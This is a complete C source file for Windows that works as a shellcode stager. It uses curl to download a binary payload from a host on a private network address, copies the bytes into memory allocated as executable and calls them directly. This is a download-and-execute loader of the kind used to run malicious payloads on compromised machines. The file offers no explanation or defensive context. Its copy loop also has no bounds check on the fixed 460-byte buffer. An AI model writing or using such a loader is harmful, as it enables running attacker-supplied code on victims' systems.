#include <stdio.h>
#include <windows.h>

int main() {
	FILE* fpipe;
	const char* command = "curl http://192.168.153.128/code.bin";
	char c = 0;
	unsigned char code[460];
	int counter = 0;
	
	fpipe = (FILE*)_popen(command, "r");
	
	if (fpipe == NULL) {
		return EXIT_FAILURE;
	}
	
	while(fread(&c, sizeof(c), 1, fpipe)) {
		code[counter] = c;
		counter += 1;
	}

	_pclose(fpipe);

	void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	((void(*)())exec)();

	WaitForSingleObject(exec, INFINITE);

	return EXIT_SUCCESS;
}